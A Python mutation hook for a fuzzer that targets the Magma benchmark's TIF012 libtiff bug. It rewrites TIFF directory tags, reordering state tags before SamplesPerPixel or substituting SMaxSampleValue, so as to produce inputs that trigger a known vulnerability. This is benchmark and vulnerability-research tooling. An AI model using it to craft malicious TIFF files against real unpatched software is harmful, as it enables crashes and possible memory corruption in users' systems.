#!/usr/bin/env python3
"""Typed FORMTRIG mutation hook for Magma TIF012.

The TIF012 trigger is order/state dependent: libtiff must observe state from
TransferFunction, SMinSampleValue, or SMaxSampleValue before SamplesPerPixel is
changed from its default single-sample state. Plain byte flips rarely make a
well-formed IFD with that ordering, so this hook rewrites the first-IFD pointer
to a new IFD appended at EOF and inserts terminal-proximal state tags before
SamplesPerPixel. When the seed already has the vulnerable ExtraSamples then
SamplesPerPixel shape, the hook first tries the smaller in-place tag
substitution observed in replayed baseline triggers: rewrite SamplesPerPixel
to SMaxSampleValue while preserving the surrounding directory context.
"""

from __future__ import annotations

import struct
import sys
from dataclasses import dataclass


TIFFTAG_SAMPLESPERPIXEL = 277
TIFFTAG_TRANSFERFUNCTION = 301
TIFFTAG_EXTRASAMPLES = 338
TIFFTAG_SMINSAMPLEVALUE = 340
TIFFTAG_SMAXSAMPLEVALUE = 341
TIFF_SHORT = 3


@dataclass(frozen=True)
class TiffEntry:
    tag: int
    typ: int
    count: int
    value: int


def parse_tiff(data: bytes) -> tuple[str, int, list[TiffEntry], int] | None:
    if len(data) < 8:
        return None
    if data[:2] == b"II":
        endian = "<"
    elif data[:2] == b"MM":
        endian = ">"
    else:
        return None
    if struct.unpack(endian + "H", data[2:4])[0] != 42:
        return None
    first_ifd = struct.unpack(endian + "I", data[4:8])[0]
    if first_ifd + 2 > len(data):
        return None
    entry_count = struct.unpack(endian + "H", data[first_ifd : first_ifd + 2])[0]
    table_end = first_ifd + 2 + entry_count * 12 + 4
    if table_end > len(data):
        return None

    entries: list[TiffEntry] = []
    for idx in range(entry_count):
        pos = first_ifd + 2 + idx * 12
        tag, typ, count, value = struct.unpack(endian + "HHII", data[pos : pos + 12])
        entries.append(TiffEntry(tag, typ, count, value))
    next_ifd = struct.unpack(endian + "I", data[table_end - 4 : table_end])[0]
    return endian, first_ifd, entries, next_ifd


def pack_entry(endian: str, entry: TiffEntry) -> bytes:
    return struct.pack(endian + "HHII", entry.tag, entry.typ, entry.count, entry.value)


def transfer_function_payload(endian: str, sample: int) -> bytes:
    values = []
    mode = sample % 3
    for i in range(256):
        if mode == 0:
            value = i * 257
        elif mode == 1:
            value = min(65535, (i * i) & 0xFFFF)
        else:
            value = 65535 - i * 257
        values.append(value)
    return struct.pack(endian + "256H", *values)


def inline_short(endian: str, value: int) -> int:
    if endian == "<":
        return value & 0xFFFF
    return (value & 0xFFFF) << 16


def has_tag(entries: list[TiffEntry], tag: int) -> bool:
    return any(entry.tag == tag for entry in entries)


def rewrite_existing_spp_to_sample_value(data: bytes, op: int) -> bytes | None:
    parsed = parse_tiff(data)
    if parsed is None:
        return None
    endian, first_ifd, entries, _next_ifd = parsed
    if has_tag(entries, TIFFTAG_SMAXSAMPLEVALUE) or has_tag(
        entries, TIFFTAG_SMINSAMPLEVALUE
    ):
        return None

    seen_extra = False
    for idx, entry in enumerate(entries):
        if entry.tag == TIFFTAG_EXTRASAMPLES:
            seen_extra = True
            continue
        if entry.tag != TIFFTAG_SAMPLESPERPIXEL:
            continue
        if not seen_extra:
            return None
        replacement = (
            TIFFTAG_SMAXSAMPLEVALUE if op % 2 == 0 else TIFFTAG_SMINSAMPLEVALUE
        )
        rewritten = bytearray(data)
        pos = first_ifd + 2 + idx * 12
        rewritten[pos : pos + 2] = struct.pack(endian + "H", replacement)
        return bytes(rewritten)
    return None


def build_tif012_candidate(data: bytes, op: int, sample: int) -> bytes | None:
    in_place = rewrite_existing_spp_to_sample_value(data, op)
    if in_place is not None:
        return in_place

    parsed = parse_tiff(data)
    if parsed is None:
        return None
    endian, _first_ifd, entries, next_ifd = parsed

    tf_payload = transfer_function_payload(endian, op + sample)
    pad = b"\x00" if len(data) % 2 else b""
    new_ifd_offset = len(data) + len(pad)

    insert_at = None
    for idx, entry in enumerate(entries):
        if entry.tag == TIFFTAG_SAMPLESPERPIXEL:
            insert_at = idx
            break
    inserted_spp: TiffEntry | None = None
    if insert_at is None:
        insert_at = min(len(entries), 4)
        inserted_spp = TiffEntry(
            TIFFTAG_SAMPLESPERPIXEL, TIFF_SHORT, 1, inline_short(endian, 3)
        )

    state_entries: list[TiffEntry] = []
    if not has_tag(entries, TIFFTAG_SMAXSAMPLEVALUE):
        state_entries.append(
            TiffEntry(TIFFTAG_SMAXSAMPLEVALUE, TIFF_SHORT, 1, inline_short(endian, 3))
        )
    elif not has_tag(entries, TIFFTAG_SMINSAMPLEVALUE):
        state_entries.append(
            TiffEntry(TIFFTAG_SMINSAMPLEVALUE, TIFF_SHORT, 1, inline_short(endian, 0))
        )

    add_transfer_function = not has_tag(entries, TIFFTAG_TRANSFERFUNCTION)
    new_entry_count = (
        len(entries)
        + len(state_entries)
        + (1 if inserted_spp is not None else 0)
        + (1 if add_transfer_function else 0)
    )
    tf_offset = new_ifd_offset + 2 + new_entry_count * 12 + 4
    if add_transfer_function:
        state_entries.append(TiffEntry(TIFFTAG_TRANSFERFUNCTION, TIFF_SHORT, 256, tf_offset))
    inserted_entries = state_entries + ([inserted_spp] if inserted_spp is not None else [])
    rewritten_entries = entries[:insert_at] + inserted_entries + entries[insert_at:]

    header = bytearray(data)
    header[4:8] = struct.pack(endian + "I", new_ifd_offset)

    new_ifd = bytearray()
    new_ifd += struct.pack(endian + "H", len(rewritten_entries))
    for entry in rewritten_entries:
        new_ifd += pack_entry(endian, entry)
    new_ifd += struct.pack(endian + "I", next_ifd)

    payload = tf_payload if add_transfer_function else b""
    return bytes(header) + pad + bytes(new_ifd) + payload


def main(argv: list[str]) -> int:
    if len(argv) < 15:
        return 2
    orig_path, mut_path, out_path = argv[1], argv[2], argv[3]
    op = int(argv[8])
    sample = int(argv[9])

    with open(orig_path, "rb") as handle:
        original = handle.read()
    with open(mut_path, "rb") as handle:
        mutated = handle.read()

    candidate = build_tif012_candidate(original, op, sample)
    if candidate is None:
        candidate = mutated

    with open(out_path, "wb") as handle:
        handle.write(candidate)
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv))
